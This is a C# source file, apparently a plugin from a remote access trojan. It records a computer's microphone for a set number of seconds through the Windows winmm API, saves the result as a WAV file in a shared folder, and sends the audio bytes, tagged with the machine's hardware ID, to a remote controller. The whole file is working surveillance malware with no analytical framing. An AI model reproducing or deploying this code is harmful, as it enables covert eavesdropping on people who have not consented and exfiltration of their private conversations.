using MessagePackLib.MessagePack;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Plugin
{
    public class AudioRecorder
    {
        private readonly string AudioPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments) + @"\micaudio.wav";
        
        [DllImport("winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        private static extern int Record(string lpstrCommand, string lpstrReturnString, int uReturnLength, int hwndCallback);
        [DllImport("winmm.dll")]
        public static extern int waveInGetNumDevs();


        public static void Audio(int second)
        {
            try 
            {
                if (waveInGetNumDevs() == 0)
                {
                    Packet.Error("Don't have microphone.");
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "Audio";
                    msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                    msgpack.ForcePathObject("Close").AsString = "true";
                    Connection.Send(msgpack.Encode2Bytes());
                }
                else
                {
                    var AR = new AudioRecorder();
                    AR.StartAR();
                    Thread.Sleep(100);
                    DateTime dt1 = DateTime.Now;
                    while ((DateTime.Now - dt1).TotalMilliseconds < second * 1000)
                    {
                        continue;
                    };
                    AR.SaveAR();
                }
            }
            catch(Exception ex)
            {
                Packet.Error(ex.Message);
            }
            
        }


        public void StartAR()
        {
            Record("open new Type waveaudio Alias recsound", "", 0, 0);
            Record("record recsound", "", 0, 0);
        }

        public void SaveAR()
        {
            Record("save recsound " + AudioPath, "", 0, 0);
            Record("close recsound", "", 0, 0);
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Audio";
            msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
            msgpack.ForcePathObject("Close").AsString = "false";
            msgpack.ForcePathObject("WavFile").SetAsBytes(File.ReadAllBytes(AudioPath));
            Connection.Send(msgpack.Encode2Bytes());
        }

    }
}

